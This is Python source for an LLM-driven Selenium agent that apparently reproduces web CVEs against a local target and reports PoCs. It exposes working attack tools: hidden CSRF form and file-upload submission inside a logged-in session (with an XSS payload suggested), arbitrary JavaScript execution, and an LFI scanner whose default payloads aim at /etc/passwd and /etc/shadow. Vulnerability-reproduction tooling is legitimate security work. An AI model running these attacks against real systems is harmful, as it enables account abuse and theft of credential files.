import os
from agentlib import AgentWithHistory
from agentlib.lib.common.parsers import BaseParser
from typing import Optional
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import re

OUTPUT_DESCRIPTION = '''
After completing the vulnerability reproduction, you MUST output the report in the specified format.

```
<report>
<success>yes/no</success>
<steps>
详细列出每一步操作和结果
</steps>
<evidence>
列出所有证据（截图路径、alert 文本、页面变化等）
</evidence>
<poc>
提供完整的 PoC 代码或步骤
</poc>
</report>
```
'''

class WebDriverOutputParser(BaseParser):
    """Parser for WebDriverAgent XML output"""
    MAX_FIX_FORMAT_TRIES = 3
    
    def get_format_instructions(self) -> str:
        return OUTPUT_DESCRIPTION
    
    def invoke(self, input, config=None, **kwargs):
        """Handle both string and dict inputs from agent executor"""
        # Agent executor returns dict with 'output' key
        if isinstance(input, dict):
            if 'output' in input:
                text = input['output']
            elif 'content' in input:
                text = input['content']
            else:
                # Try to convert dict to string
                text = str(input)
        else:
            text = input
        
        # Ensure text is a string
        if not isinstance(text, str):
            text = str(text)
        
        return self.parse(text, **kwargs)
    
    def parse(self, text: str, **kwargs) -> dict:
        """Parse XML report format from WebDriverAgent"""
        try:
            # Try standard XML format first
            success_match = re.search(r'<success>(.*?)</success>', text, re.DOTALL | re.IGNORECASE)
            steps_match = re.search(r'<steps>(.*?)</steps>', text, re.DOTALL | re.IGNORECASE)
            evidence_match = re.search(r'<evidence>(.*?)</evidence>', text, re.DOTALL | re.IGNORECASE)
            poc_match = re.search(r'<poc>(.*?)</poc>', text, re.DOTALL | re.IGNORECASE)
            
            if success_match:
                success = success_match.group(1).strip().lower()
                # Normalize success value
                if success in ['yes', 'true', '1', 'success', 'successful']:
                    success = 'yes'
                elif success in ['no', 'false', '0', 'failed', 'failure']:
                    success = 'no'
                
                steps = steps_match.group(1).strip() if steps_match else "No detailed steps"
                evidence = evidence_match.group(1).strip() if evidence_match else "No evidence captured"
                poc = poc_match.group(1).strip() if poc_match else "No PoC provided"
                
                print(f'✅ Successfully parsed WebDriver output! Success={success}')
                return dict(
                    success=success,
                    exploit=steps,
                    poc=poc,
                    evidence=evidence
                )
            
            # Fallback: Try to infer success from text content
            text_lower = text.lower()
            
            # Check for success indicators
            success_indicators = [
                'successfully', 'exploit successful', 'vulnerability confirmed',
                'xss triggered', 'csrf successful', 'attack succeeded',
                'poc works', 'vulnerability exploited', 'alert detected'
            ]
            failure_indicators = [
                'failed', 'error', 'could not', 'unable to', 'not vulnerable',
                'blocked', 'protected', 'timeout', 'exception'
            ]
            
            success_score = sum(1 for ind in success_indicators if ind in text_lower)
            failure_score = sum(1 for ind in failure_indicators if ind in text_lower)
            
            inferred_success = 'yes' if success_score > failure_score else 'no'
            
            print(f'⚠️ No XML tags found, inferred success={inferred_success} (score: +{success_score}/-{failure_score})')
            
            return dict(
                success=inferred_success,
                exploit=text[:1500] if len(text) > 1500 else text,
                poc="See exploit steps above",
                evidence=f"Inferred from output (success indicators: {success_score}, failure indicators: {failure_score})"
            )
            
        except Exception as e:
            print(f'🤡 Parse Error: {e}')
            return dict(
                success="no",
                exploit=f"Parse error: {str(e)}",
                poc=text[:500] if text else "No output",
                evidence="Parse error"
            )

class WebDriverAgent(AgentWithHistory[dict, str]):
    """
    Agent for performing browser-based vulnerability exploitation
    Handles CSRF, XSS, and other web-based attacks that require browser interaction
    """
    __LLM_MODEL__ = 'gpt-4o-mini'  # 降级为 mini 节省成本，WebDriverAgent 工具调用相对简单
    __SYSTEM_PROMPT_TEMPLATE__ = 'webDriverAgent/webDriverAgent.system.j2'
    __USER_PROMPT_TEMPLATE__ = 'webDriverAgent/webDriverAgent.user.j2'
    __OUTPUT_PARSER__ = WebDriverOutputParser
    __MAX_TOOL_ITERATIONS__ = 20  # 降低迭代次数避免浪费 API 调用（从40降到20）
    __ENABLE_FILE_SEARCH__ = False  # 禁用文件搜索
    __ENABLE_CODE_INTERPRETER__ = False  # 禁用代码解释器
    
    CVE_KNOWLEDGE: Optional[str]
    TARGET_URL: Optional[str]
    ATTACK_TYPE: Optional[str]  # 'csrf', 'xss', 'clickjacking', etc.
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.CVE_KNOWLEDGE = kwargs.get('cve_knowledge')
        self.TARGET_URL = kwargs.get('target_url', 'http://localhost:9600')
        self.ATTACK_TYPE = kwargs.get('attack_type', 'csrf')
        self.driver = None
        self.attack_server_running = False
        
    def get_input_vars(self, *args, **kwargs) -> dict:
        vars = super().get_input_vars(*args, **kwargs)
        vars.update(
            CVE_KNOWLEDGE = self.CVE_KNOWLEDGE,
            TARGET_URL = self.TARGET_URL,
            ATTACK_TYPE = self.ATTACK_TYPE
        )
        return vars
    
    def setup_driver(self, headless: bool = True):
        """Initialize Chrome WebDriver with appropriate options"""
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.chrome.service import Service
        
        chrome_options = Options()
        if headless:
            chrome_options.add_argument('--headless=new')  # 使用新版 headless 模式
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-software-rasterizer')
        # 增加稳定性配置
        chrome_options.add_argument('--disable-background-networking')
        chrome_options.add_argument('--disable-default-apps')
        chrome_options.add_argument('--disable-sync')
        chrome_options.add_argument('--disable-translate')
        chrome_options.add_argument('--remote-debugging-port=9222')
        # 额外稳定性选项 - 解决 renderer timeout 问题
        chrome_options.add_argument('--disable-hang-monitor')
        chrome_options.add_argument('--disable-ipc-flooding-protection')
        chrome_options.add_argument('--disable-renderer-backgrounding')
        chrome_options.add_argument('--disable-backgrounding-occluded-windows')
        chrome_options.add_argument('--memory-pressure-off')
        chrome_options.page_load_strategy = 'eager'  # 更快响应，不等待所有资源
        
        try:
            # 使用 webdriver-manager 自动下载和管理 ChromeDriver
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            # 设置超时 - 增加到120秒以解决慢响应问题
            self.driver.set_page_load_timeout(120)
            self.driver.set_script_timeout(120)
            self.driver.implicitly_wait(15)
            return "WebDriver initialized successfully"
        except Exception as e:
            return f"WebDriver initialization failed: {str(e)}"
    
    def cleanup_driver(self):
        """Close and cleanup WebDriver"""
        if self.driver:
            self.driver.quit()
            self.driver = None
        return "WebDriver cleaned up"
    
    def get_available_tools(self):
        """Return all WebDriver tools for the agent to use"""
        from langchain.tools import StructuredTool
        
        # Create StructuredTool from bound instance methods
        # This ensures 'self' is properly bound when tools are called
        tools = [
            StructuredTool.from_function(
                func=self._navigate_to_url,
                name="navigate_to_url",
                description="Navigate to a specific URL. Args: url (str) - The target URL to visit. Returns: Success message with current URL and page title."
            ),
            StructuredTool.from_function(
                func=self._find_element,
                name="find_element", 
                description="Find an element on the page. Args: selector (str) - CSS selector or XPath, by (str) - 'css' or 'xpath'. Returns: Element info or error."
            ),
            StructuredTool.from_function(
                func=self._click_element,
                name="click_element",
                description="Click an element on the page. Args: selector (str) - CSS selector or XPath, by (str) - 'css' or 'xpath'. Returns: Success or error message."
            ),
            StructuredTool.from_function(
                func=self._input_text,
                name="input_text",
                description="Input text into a form field. Args: selector (str) - CSS selector or XPath, text (str) - Text to input, by (str) - 'css' or 'xpath'. Returns: Success or error message."
            ),
            StructuredTool.from_function(
                func=self._execute_javascript,
                name="execute_javascript",
                description="Execute JavaScript in the browser context. Args: script (str) - JavaScript code to execute. Returns: Script result or error message."
            ),
            StructuredTool.from_function(
                func=self._get_page_source,
                name="get_page_source",
                description="Get the current page HTML source (truncated to first 2000 chars). Returns: Page source HTML."
            ),
            StructuredTool.from_function(
                func=self._check_alert,
                name="check_alert",
                description="Check if an alert dialog is present (useful for XSS detection). Returns: Alert text or 'No alert present'."
            ),
            StructuredTool.from_function(
                func=self._take_screenshot,
                name="take_screenshot",
                description="Take a screenshot of the current page. Args: filename (str) - Screenshot filename. Returns: Screenshot file path."
            ),
            StructuredTool.from_function(
                func=self._create_csrf_page,
                name="create_csrf_page",
                description="Create a malicious HTML page for CSRF attack. Args: html_content (str) - HTML content, filename (str) - Output filename. Returns: File path of created page."
            ),
            StructuredTool.from_function(
                func=self._verify_csrf_vulnerability,
                name="verify_csrf_vulnerability",
                description="Check if forms on the current page are vulnerable to CSRF (missing token protection). Args: form_selector (str) - CSS selector for forms, default 'form'. Returns: List of forms with vulnerability status."
            ),
            StructuredTool.from_function(
                func=self._submit_csrf_attack,
                name="submit_csrf_attack",
                description="Submit a CSRF attack by creating and submitting a form with the current session. Args: target_url (str) - URL to submit to, form_data (str) - JSON string of form fields, method (str) - HTTP method. Returns: Result of submission."
            ),
            StructuredTool.from_function(
                func=self._upload_file_csrf,
                name="upload_file_csrf",
                description="Perform CSRF file upload attack using XHR in current logged-in session. Args: upload_url (str), file_input_name (str), file_content (str), filename (str), content_type (str). Returns: Upload result."
            ),
            StructuredTool.from_function(
                func=self._login,
                name="login",
                description="Perform login on a web application. This is more reliable than manually inputting credentials. Args: login_url (str) - URL of login page, username (str), password (str), username_selector (str) - CSS selector for username field (default: input[name='username']), password_selector (str) - CSS selector for password field (default: input[name='password']), submit_selector (str) - CSS selector for submit button (default: button[type='submit']). Returns: Login result with current URL."
            ),
            StructuredTool.from_function(
                func=self._send_http_request,
                name="send_http_request",
                description="Send HTTP request (GET/POST/PUT/DELETE) to test API vulnerabilities like LFI, SSRF, SQLi. Args: url (str), method (str) - HTTP method, data (str) - JSON data for POST/PUT, headers (str) - JSON headers. Returns: HTTP response with status and body."
            ),
            StructuredTool.from_function(
                func=self._check_lfi_vulnerability,
                name="check_lfi_vulnerability",
                description="Check for Local File Inclusion (LFI) / Path Traversal vulnerability by attempting to read sensitive files. Args: base_url (str) - Target URL with parameter placeholder like http://target/api?file=, payloads (str) - comma-separated LFI payloads like '../../../etc/passwd,....//....//etc/passwd'. Returns: LFI test results."
            ),
        ]
        
        return tools
    
    # Internal methods that are bound to instance (for tool use)
    def _navigate_to_url(self, url: str) -> str:
        try:
            if not self.driver:
                result = self.setup_driver()
                if "failed" in result.lower():
                    return f"Error: {result}"
            if not self.driver:
                return "Error: WebDriver initialization failed - driver is None"
            self.driver.get(url)
            time.sleep(2)
            return f"Navigated to {self.driver.current_url}, Page title: {self.driver.title}"
        except Exception as e:
            return f"Error navigating to URL: {str(e)}"
    
    def _find_element(self, selector: str, by: str = "css") -> str:
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        try:
            by_type = By.CSS_SELECTOR if by == "css" else By.XPATH
            element = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((by_type, selector))
            )
            return f"Found element: {element.tag_name}, text: {element.text[:100] if element.text else '(no text)'}"
        except TimeoutException:
            return f"Element not found: {selector}"
        except Exception as e:
            return f"Error finding element: {str(e)}"
    
    def _click_element(self, selector: str, by: str = "css") -> str:
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        try:
            by_type = By.CSS_SELECTOR if by == "css" else By.XPATH
            element = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((by_type, selector))
            )
            
            # 尝试普通点击
            try:
                element.click()
            except Exception:
                # 如果普通点击失败，使用 JavaScript 点击
                self.driver.execute_script("arguments[0].click();", element)
            
            time.sleep(2)  # 增加等待时间，确保页面跳转
            return f"Clicked element: {selector}, Current URL: {self.driver.current_url}"
        except Exception as e:
            # 最后尝试用 JavaScript 直接提交表单
            try:
                self.driver.execute_script("document.querySelector('form').submit();")
                time.sleep(2)
                return f"Submitted form via JavaScript, Current URL: {self.driver.current_url}"
            except:
                return f"Error clicking element: {str(e)}"
    
    def _login(self, login_url: str, username: str, password: str, 
               username_selector: str = "input[name='username']",
               password_selector: str = "input[name='password']",
               submit_selector: str = "button[type='submit']") -> str:
        """Reliable login method with multiple fallback strategies"""
        try:
            if not self.driver:
                result = self.setup_driver()
                if "failed" in result.lower():
                    return f"Error: {result}"
            
            # 1. 导航到登录页
            self.driver.get(login_url)
            time.sleep(2)
            
            # 2. 等待页面加载
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, username_selector))
            )
            
            # 3. 输入用户名
            user_input = self.driver.find_element(By.CSS_SELECTOR, username_selector)
            user_input.clear()
            user_input.send_keys(username)
            
            # 4. 输入密码
            pass_input = self.driver.find_element(By.CSS_SELECTOR, password_selector)
            pass_input.clear()
            pass_input.send_keys(password)
            
            # 5. 点击登录按钮（多种策略）
            login_success = False
            original_url = self.driver.current_url
            
            # 策略1：直接点击按钮
            try:
                submit_btn = WebDriverWait(self.driver, 5).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, submit_selector))
                )
                submit_btn.click()
                time.sleep(2)
            except:
                pass
            
            # 检查是否跳转
            if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
                login_success = True
            
            # 策略2：JavaScript 点击
            if not login_success:
                try:
                    self.driver.execute_script(f"document.querySelector('{submit_selector}').click();")
                    time.sleep(2)
                    if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
                        login_success = True
                except:
                    pass
            
            # 策略3：提交表单
            if not login_success:
                try:
                    self.driver.execute_script("document.querySelector('form').submit();")
                    time.sleep(2)
                    if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
                        login_success = True
                except:
                    pass
            
            # 策略4：按 Enter 键
            if not login_success:
                try:
                    from selenium.webdriver.common.keys import Keys
                    pass_input = self.driver.find_element(By.CSS_SELECTOR, password_selector)
                    pass_input.send_keys(Keys.RETURN)
                    time.sleep(2)
                    if self.driver.current_url != original_url and '/login' not in self.driver.current_url:
                        login_success = True
                except:
                    pass
            
            # 6. 验证登录结果
            current_url = self.driver.current_url
            page_title = self.driver.title
            
            if login_success or ('/login' not in current_url):
                return f"✅ Login successful! Current URL: {current_url}, Title: {page_title}"
            else:
                # 检查页面是否有错误消息
                page_source = self.driver.page_source.lower()
                if 'invalid' in page_source or 'error' in page_source or 'incorrect' in page_source:
                    return f"❌ Login failed: Invalid credentials. Current URL: {current_url}"
                else:
                    return f"⚠️ Login status unclear. Current URL: {current_url}, Title: {page_title}. The page may need additional verification."
                    
        except Exception as e:
            return f"Error during login: {str(e)}"
    
    def _input_text(self, selector: str, text: str, by: str = "css") -> str:
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        try:
            by_type = By.CSS_SELECTOR if by == "css" else By.XPATH
            element = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((by_type, selector))
            )
            element.clear()
            element.send_keys(text)
            return f"Input text '{text[:50]}...' into {selector}"
        except Exception as e:
            return f"Error inputting text: {str(e)}"
    
    def _execute_javascript(self, script: str) -> str:
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        try:
            result = self.driver.execute_script(script)
            return f"JavaScript executed. Result: {str(result)[:200] if result else 'undefined'}"
        except Exception as e:
            return f"Error executing JavaScript: {str(e)}"
    
    def _get_page_source(self) -> str:
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        source = self.driver.page_source
        return f"Page source (first 2000 chars):\n{source[:2000]}"
    
    def _check_alert(self) -> str:
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        try:
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            return f"Alert detected! Text: {alert_text}"
        except:
            return "No alert present"
    
    def _take_screenshot(self, filename: str) -> str:
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        try:
            shared_dir = os.environ.get('SHARED_DIR', '/workspaces/submission/src/shared')
            filepath = f"{shared_dir}/{filename}"
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            self.driver.save_screenshot(filepath)
            return f"Screenshot saved to {filepath}"
        except Exception as e:
            return f"Error taking screenshot: {str(e)}"
    
    def _create_csrf_page(self, html_content: str, filename: str = "csrf_exploit.html") -> str:
        try:
            shared_dir = os.environ.get('SHARED_DIR', '/workspaces/submission/src/shared')
            filepath = f"{shared_dir}/{filename}"
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(html_content)
            return f"CSRF page created at {filepath}"
        except Exception as e:
            return f"Error creating CSRF page: {str(e)}"
    
    def _verify_csrf_vulnerability(self, form_selector: str = "form") -> str:
        """Check if a form is vulnerable to CSRF (no token protection)"""
        if not self.driver:
            return "Error: WebDriver not initialized. Call navigate_to_url first."
        try:
            # Find all forms
            forms = self.driver.find_elements(By.CSS_SELECTOR, form_selector)
            if not forms:
                return f"No forms found with selector: {form_selector}"
            
            results = []
            for i, form in enumerate(forms):
                action = form.get_attribute('action') or 'current page'
                method = form.get_attribute('method') or 'GET'
                
                # Check for CSRF protection
                csrf_indicators = [
                    'csrf', 'token', '_token', 'authenticity_token',
                    'csrfmiddlewaretoken', '__requestverificationtoken'
                ]
                
                form_html = form.get_attribute('outerHTML').lower()
                has_csrf_token = any(ind in form_html for ind in csrf_indicators)
                
                # Also check for hidden inputs
                hidden_inputs = form.find_elements(By.CSS_SELECTOR, "input[type='hidden']")
                hidden_names = [inp.get_attribute('name').lower() for inp in hidden_inputs if inp.get_attribute('name')]
                has_csrf_hidden = any(any(ind in name for ind in csrf_indicators) for name in hidden_names)
                
                is_vulnerable = not (has_csrf_token or has_csrf_hidden)
                status = "🚨 VULNERABLE (No CSRF protection!)" if is_vulnerable else "✅ Protected"
                
                results.append(f"Form {i+1}: action={action}, method={method}, {status}")
                if is_vulnerable:
                    results.append(f"  Hidden inputs: {hidden_names if hidden_names else 'None'}")
            
            return "\\n".join(results)
        except Exception as e:
            return f"Error checking CSRF: {str(e)}"
    
    def _submit_csrf_attack(self, target_url: str, form_data: str, method: str = "POST") -> str:
        """
        Submit a CSRF attack request using JavaScript (simulates cross-site request).
        This works because we're already in a logged-in session.
        Args:
            target_url: The URL to submit the request to
            form_data: JSON string of form data, e.g., '{"key": "value"}'
            method: HTTP method (POST, PUT, etc.)
        """
        if not self.driver:
            return "Error: WebDriver not initialized. Navigate and login first."
        try:
            import json
            data = json.loads(form_data) if isinstance(form_data, str) else form_data
            
            # Build JavaScript to submit form
            js_code = f"""
            return new Promise((resolve, reject) => {{
                const form = document.createElement('form');
                form.method = '{method}';
                form.action = '{target_url}';
                form.style.display = 'none';
                
                const data = {json.dumps(data)};
                for (const [key, value] of Object.entries(data)) {{
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = value;
                    form.appendChild(input);
                }}
                
                document.body.appendChild(form);
                
                // For file uploads, we need a different approach
                // This handles simple form submissions
                form.submit();
                
                // Return success immediately (form.submit() navigates away)
                resolve('Form submitted to {target_url}');
            }});
            """
            
            result = self.driver.execute_script(js_code)
            time.sleep(2)  # Wait for navigation
            
            new_url = self.driver.current_url
            new_title = self.driver.title
            
            return f"CSRF attack submitted! Now at: {new_url}, Title: {new_title}"
        except Exception as e:
            return f"Error submitting CSRF: {str(e)}"
    
    def _upload_file_csrf(self, upload_url: str, file_input_name: str, file_content: str, filename: str, content_type: str = "image/png") -> str:
        """
        Perform a CSRF file upload attack using XMLHttpRequest.
        This simulates what a CSRF attack page would do.
        Args:
            upload_url: The file upload endpoint
            file_input_name: The name attribute of the file input (e.g., 'file')
            file_content: Content to upload (for XSS, use '<img src=x onerror=alert(1)>')
            filename: Filename to use (e.g., 'malicious.html')
            content_type: MIME type
        """
        if not self.driver:
            return "Error: WebDriver not initialized. Navigate and login first."
        try:
            import json
            # 正确转义内容用于 JavaScript
            escaped_content = json.dumps(file_content)  # 这会正确处理引号和特殊字符
            
            # 使用同步方式而不是 async，避免超时问题
            js_code = f"""
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '{upload_url}', false);  // 同步请求
            xhr.withCredentials = true;  // Include cookies (CSRF attack)
            
            var formData = new FormData();
            var fileContent = {escaped_content};  // 使用 JSON 转义的内容
            var blob = new Blob([fileContent], {{ type: '{content_type}' }});
            formData.append('{file_input_name}', blob, '{filename}');
            
            try {{
                xhr.send(formData);
                return 'Upload completed! Status: ' + xhr.status + ', Response: ' + xhr.responseText.substring(0, 500);
            }} catch(e) {{
                return 'XHR error: ' + e.message;
            }}
            """
            
            result = self.driver.execute_script(js_code)
            time.sleep(1)
            return f"File upload CSRF result: {result}"
        except Exception as e:
            return f"Error in file upload CSRF: {str(e)}"
    
    def _send_http_request(self, url: str, method: str = "GET", data: str = None, headers: str = None) -> str:
        """
        Send HTTP request for testing API vulnerabilities (LFI, SSRF, SQLi, etc.)
        Uses requests library for flexibility.
        """
        try:
            import requests
            import json
            
            # 解析 headers
            req_headers = {}
            if headers:
                try:
                    req_headers = json.loads(headers)
                except:
                    pass
            
            # 解析 data
            req_data = None
            if data:
                try:
                    req_data = json.loads(data)
                except:
                    req_data = data
            
            # 发送请求
            method = method.upper()
            if method == "GET":
                resp = requests.get(url, headers=req_headers, timeout=30, verify=False)
            elif method == "POST":
                resp = requests.post(url, json=req_data if isinstance(req_data, dict) else None, 
                                    data=req_data if isinstance(req_data, str) else None,
                                    headers=req_headers, timeout=30, verify=False)
            elif method == "PUT":
                resp = requests.put(url, json=req_data, headers=req_headers, timeout=30, verify=False)
            elif method == "DELETE":
                resp = requests.delete(url, headers=req_headers, timeout=30, verify=False)
            else:
                return f"Unsupported method: {method}"
            
            # 检查响应内容是否包含敏感信息（LFI 检测）
            body = resp.text[:2000]  # 限制长度
            lfi_indicators = ['root:', '/bin/bash', 'daemon:', 'www-data', '[boot loader]', 'Windows Registry']
            lfi_detected = any(ind in body for ind in lfi_indicators)
            
            return f"""HTTP Response:
Status: {resp.status_code}
Headers: {dict(list(resp.headers.items())[:5])}
Body (first 2000 chars): {body}
{'🚨 LFI DETECTED! Sensitive file content found!' if lfi_detected else ''}"""
        
        except Exception as e:
            return f"HTTP request error: {str(e)}"
    
    def _check_lfi_vulnerability(self, base_url: str, payloads: str = None) -> str:
        """
        Check for LFI/Path Traversal vulnerability by testing common payloads.
        """
        try:
            import requests
            
            # 默认 LFI payloads
            default_payloads = [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '../../../../../../../etc/passwd',
                '..%2f..%2f..%2fetc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '../../../etc/shadow',
            ]
            
            test_payloads = payloads.split(',') if payloads else default_payloads
            results = []
            vulnerable = False
            
            for payload in test_payloads:
                payload = payload.strip()
                # 替换 URL 中的占位符或直接附加
                if '{payload}' in base_url:
                    test_url = base_url.replace('{payload}', payload)
                elif '=' in base_url:
                    test_url = base_url + payload
                else:
                    test_url = base_url + '/' + payload
                
                try:
                    resp = requests.get(test_url, timeout=10, verify=False)
                    body = resp.text[:1000]
                    
                    # 检查 LFI 成功指标
                    lfi_indicators = ['root:', '/bin/bash', 'daemon:', 'www-data', 
                                     '[boot loader]', 'Windows Registry', '[extensions]']
                    if any(ind in body for ind in lfi_indicators):
                        vulnerable = True
                        results.append(f"🚨 VULNERABLE with payload '{payload}': Found sensitive content")
                        results.append(f"   Response snippet: {body[:300]}")
                    else:
                        results.append(f"Tested '{payload}': Status {resp.status_code}, no sensitive content")
                except Exception as e:
                    results.append(f"Error testing '{payload}': {str(e)}")
            
            summary = "🚨 LFI VULNERABILITY CONFIRMED!" if vulnerable else "No LFI vulnerability detected"
            return f"{summary}\n\nTest Results:\n" + "\n".join(results)
        
        except Exception as e:
            return f"LFI check error: {str(e)}"
    
    def get_cost(self, *args, **kw) -> float:
        total_cost = 0
        for model_name, token_usage in self.token_usage.items():
            total_cost += token_usage.get_costs(model_name)['total_cost']
        return total_cost

    
    def __del__(self):
        """Cleanup on deletion"""
        self.cleanup_driver()
